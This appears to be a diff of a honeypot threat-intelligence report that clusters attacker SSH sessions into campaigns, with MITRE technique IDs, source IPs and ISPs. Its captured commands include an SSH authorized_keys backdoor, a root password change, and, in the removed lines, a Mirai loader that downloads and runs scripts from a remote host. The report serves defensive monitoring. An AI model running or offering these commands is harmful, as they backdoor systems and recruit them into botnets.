@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-09-29T11:56:32.268714+00:00",
-  "total_sessions_with_commands": 26,
-  "total_clusters": 7,
-  "campaign_clusters": 5,
-  "singleton_clusters": 1,
+  "generated_at": "2026-09-30T02:50:40.074888+00:00",
+  "total_sessions_with_commands": 4,
+  "total_clusters": 4,
+  "campaign_clusters": 2,
+  "singleton_clusters": 3,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 2,
+      "session_count": 1,
+      "unique_ip_count": 1,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -27,54 +27,16 @@
     },
     {
       "cluster_id": "CLU-002",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 17,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1592",
-        "T1078",
-        "T1083"
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 17,
-      "unique_ip_count": 17,
+      "session_count": 1,
+      "unique_ip_count": 1,
       "ttps": [
         "T1021.004",
         "T1078",
         "T1070",
         "T1140",
         "T1105"
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1105",
-        "T1070",
-        "T1140",
-        "T1059.004"
-      ]
-    },
-    {
-      "cluster_id": "CLU-006",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1105",
-        "T1140",
-        "T1059.004"
       ]
     }
   ],
@@ -99,13 +61,12 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 2,
+      "session_count": 1,
       "unique_ips": [
-        "125.88.225.11",
-        "181.62.56.67"
+        "118.145.238.60"
       ],
-      "unique_ip_count": 2,
-      "sequence_hash": "77e1586ecf3cb1e6",
+      "unique_ip_count": 1,
+      "sequence_hash": "7722c53d59c19ffb",
       "ttps": [
         {
           "id": "T1021.004",
@@ -152,114 +113,27 @@
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l",
-        "echo -e \"cod\\njUWK355twEp6\\njUWK355twEp6\"|passwd|bash",
-        "Enter new UNIX password:",
-        "echo \"cod\\njUWK355twEp6\\njUWK355twEp6\\n\"|passwd",
+        "echo \"root:pru3GNH0vyUw\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
         "ls -lh $(which ls)",
-        "which ls"
+        "which ls",
+        "crontab -l"
       ],
       "members": [
         {
-          "session_id": "IR-33e898b988b5",
-          "src_ip": "125.88.225.11",
+          "session_id": "IR-e9d802ea2733",
+          "src_ip": "118.145.238.60",
           "country": "CN",
-          "isp": "CHINANET Guangdong province network",
-          "command_count": 20,
-          "timestamp": "2026-09-29T10:39:53.774939Z"
-        },
-        {
-          "session_id": "IR-540a0110e142",
-          "src_ip": "181.62.56.67",
-          "country": "CO",
-          "isp": "Telmex Colombia S.A.",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
           "command_count": 19,
-          "timestamp": "2026-09-29T10:33:10.835077Z"
+          "timestamp": "2026-09-30T00:18:03.906150Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
-      "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-      "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 3,
-          "pattern_total": 6
-        },
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 17,
-      "unique_ips": [
-        "193.32.162.84"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "4ed226bcbb7ec342",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
-          "id": "T1078",
-          "name": "T1078"
-        },
-        {
-          "id": "T1083",
-          "name": "T1083"
-        }
-      ],
-      "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una",
-        "uname -s -v -n -m 2 > /dev/null",
-        "/bin/uname -s -v -n -m 2 > /dev/null",
-        "/usr/bin/uname -s -v -n -m 2 > /dev/null",
-        "busybox uname -s -v -n -m 2 > /dev/null",
-        "( [ -f /proc/version ]",
-        "[ -f /proc/version ]",
-        "head -1 /proc/version | cut -d -f1",
-        "[ -f /etc/os-release ]",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n \"$v\" ] && { printf '%s\\n' \"$v\"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\\n' \"$v\") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n \"$v\" ] && { printf '%s\\n' \"$v\"; exit; }; done; for c in arch"
-      ],
-      "members": [
-        {
-          "session_id": "IR-d146700580ef",
-          "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
-          "command_count": 10,
-          "timestamp": "2026-09-29T09:08:46.810437Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -278,27 +152,11 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 17,
+      "session_count": 1,
       "unique_ips": [
-        "120.48.175.69",
-        "118.196.74.97",
-        "107.150.105.10",
-        "192.210.254.249",
-        "59.16.212.232",
-        "20.106.202.68",
-        "168.76.131.178",
-        "45.78.202.217",
-        "43.133.61.254",
-        "179.32.213.29",
-        "159.65.5.51",
-        "43.135.154.242",
-        "187.141.71.166",
-        "115.190.197.74",
-        "129.121.139.106",
-        "14.36.171.104",
-        "50.84.211.204"
+        "207.166.168.11"
       ],
-      "unique_ip_count": 17,
+      "unique_ip_count": 1,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -328,140 +186,40 @@
       ],
       "members": [
         {
-          "session_id": "IR-45f6a3d8b502",
-          "src_ip": "120.48.175.69",
-          "country": "CN",
-          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T06:55:32.129498Z"
-        },
-        {
-          "session_id": "IR-61faa87a3120",
-          "src_ip": "129.121.139.106",
-          "country": "US",
-          "isp": "Oso Grande IP Services, LLC",
-          "command_count": 2,
-          "timestamp": "2026-09-29T06:58:30.727458Z"
-        },
-        {
-          "session_id": "IR-877ae46d5dfd",
-          "src_ip": "192.210.254.249",
-          "country": "US",
-          "isp": "HostPapa",
-          "command_count": 2,
-          "timestamp": "2026-09-29T07:01:35.566757Z"
-        },
-        {
-          "session_id": "IR-7491f43fa71f",
-          "src_ip": "159.65.5.51",
-          "country": "SG",
-          "isp": "DigitalOcean, LLC",
-          "command_count": 2,
-          "timestamp": "2026-09-29T07:01:58.572237Z"
-        },
-        {
-          "session_id": "IR-1acf026763a7",
-          "src_ip": "50.84.211.204",
-          "country": "US",
-          "isp": "RGB Hospitality",
-          "command_count": 2,
-          "timestamp": "2026-09-29T08:09:12.956023Z"
-        },
-        {
-          "session_id": "IR-f41b67370060",
-          "src_ip": "168.76.131.178",
-          "country": "HK",
-          "isp": "Free State Education Department",
-          "command_count": 2,
-          "timestamp": "2026-09-29T08:14:12.648293Z"
-        },
-        {
-          "session_id": "IR-7d5f2d91da9d",
-          "src_ip": "118.196.74.97",
-          "country": "CN",
-          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T08:15:51.410278Z"
-        },
-        {
-          "session_id": "IR-2545deed45dc",
-          "src_ip": "14.36.171.104",
-          "country": "KR",
-          "isp": "Korea Telecom",
-          "command_count": 2,
-          "timestamp": "2026-09-29T08:17:52.364041Z"
-        },
-        {
-          "session_id": "IR-6fefd9d29cb3",
-          "src_ip": "115.190.197.74",
-          "country": "CN",
-          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T09:22:04.657706Z"
-        },
-        {
-          "session_id": "IR-468032938f58",
-          "src_ip": "107.150.105.10",
-          "country": "US",
-          "isp": "UCLOUD",
-          "command_count": 2,
-          "timestamp": "2026-09-29T09:23:04.556801Z"
-        },
-        {
-          "session_id": "IR-e4cdccddfa9b",
-          "src_ip": "45.78.202.217",
+          "session_id": "IR-48f4243c1eb1",
+          "src_ip": "207.166.168.11",
           "country": "SG",
           "isp": "BYTEPLUS",
           "command_count": 2,
-          "timestamp": "2026-09-29T09:30:06.030957Z"
-        },
+          "timestamp": "2026-09-30T00:02:15.345104Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "45.198.224.141"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7d10fced96b38c84",
+      "ttps": [],
+      "representative_commands": [
+        "echo OK"
+      ],
+      "members": [
         {
-          "session_id": "IR-373d4d362de3",
-          "src_ip": "43.135.154.242",
-          "country": "US",
-          "isp": "Asia Pacific Network Information Center, Pty. Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:26:35.501551Z"
-        },
-        {
-          "session_id": "IR-92e84588d73e",
-          "src_ip": "59.16.212.232",
-          "country": "KR",
-          "isp": "Korea Telecom",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:27:25.684410Z"
-        },
-        {
-          "session_id": "IR-5a3312dc6806",
-          "src_ip": "179.32.213.29",
-          "country": "CO",
-          "isp": "COLOMBIA TELECOMUNICACIONES S.A. ESP BIC",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:30:12.081403Z"
-        },
-        {
-          "session_id": "IR-d72e7c3169fa",
-          "src_ip": "43.133.61.254",
-          "country": "SG",
-          "isp": "Asia Pacific Network Information Center, Pty. Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:36:33.022953Z"
-        },
-        {
-          "session_id": "IR-45f1a902e8f7",
-          "src_ip": "187.141.71.166",
-          "country": "MX",
-          "isp": "Uninet S.A. de C.V.",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:37:02.538698Z"
-        },
-        {
-          "session_id": "IR-8b7692d35b8f",
-          "src_ip": "20.106.202.68",
-          "country": "US",
-          "isp": "Microsoft Corporation",
-          "command_count": 2,
-          "timestamp": "2026-09-29T10:39:44.296260Z"
+          "session_id": "IR-e3de663a36ec",
+          "src_ip": "45.198.224.141",
+          "country": "CA",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-09-30T00:08:23.648458Z"
         }
       ]
     },
@@ -472,185 +230,29 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 4,
-      "unique_ips": [
-        "182.61.33.68",
-        "218.90.33.83",
-        "58.221.60.25"
-      ],
-      "unique_ip_count": 3,
-      "sequence_hash": "c32b4937ce8564ea",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        }
-      ],
-      "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-59d57ae9c928",
-          "src_ip": "58.221.60.25",
-          "country": "CN",
-          "isp": "CHINANET jiangsu province network",
-          "command_count": 1,
-          "timestamp": "2026-09-29T08:02:55.343687Z"
-        },
-        {
-          "session_id": "IR-43a8ffe923fe",
-          "src_ip": "218.90.33.83",
-          "country": "CN",
-          "isp": "CHINANET jiangsu province network",
-          "command_count": 1,
-          "timestamp": "2026-09-29T10:26:16.266408Z"
-        },
-        {
-          "session_id": "IR-aa7d011c4970",
-          "src_ip": "182.61.33.68",
-          "country": "CN",
-          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
-          "command_count": 1,
-          "timestamp": "2026-09-29T10:31:12.554477Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 2,
-      "unique_ips": [
-        "94.154.43.69"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "aaa3d10acc34e198",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
-        }
-      ],
-      "representative_commands": [
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh;curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh;busybox wget http://213.232.114.14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114.14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114.14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-55341f5014e0",
-          "src_ip": "94.154.43.69",
-          "country": "NL",
-          "isp": "Storm Industries LLC",
-          "command_count": 1,
-          "timestamp": "2026-09-29T08:13:40.344784Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-006",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 2,
-      "unique_ips": [
-        "94.154.43.69"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "34f24f34babc0ff7",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
-        }
-      ],
-      "representative_commands": [
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/handshakebins.sh;curl -o handshakebins.sh http://213.232.114.14/nokillbins/handshakebins.sh;busybox wget http://213.232.114.14/nokillbins/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114.14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114.14 ftp1.sh ftp1.sh;sh ftp1.sh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-37a7c20c8fde",
-          "src_ip": "94.154.43.69",
-          "country": "NL",
-          "isp": "Storm Industries LLC",
-          "command_count": 1,
-          "timestamp": "2026-09-29T08:16:10.721102Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-007",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "89.87.252.151"
+        "218.75.165.74"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "e97166b54500da3a",
-      "ttps": [],
+      "sequence_hash": "28ba533b0f3c4df6",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
       "representative_commands": [
-        "enable"
+        "uname -a"
       ],
       "members": [
         {
-          "session_id": "IR-12bf908446ec",
-          "src_ip": "89.87.252.151",
-          "country": "FR",
-          "isp": "Bouygues Telecom SA",
+          "session_id": "IR-907c81a0d2bc",
+          "src_ip": "218.75.165.74",
+          "country": "CN",
+          "isp": "CHINANET Hunan province network",
           "command_count": 1,
-          "timestamp": "2026-09-29T10:12:44.109069Z"
+          "timestamp": "2026-09-30T00:08:37.438189Z"
         }
       ]
     }
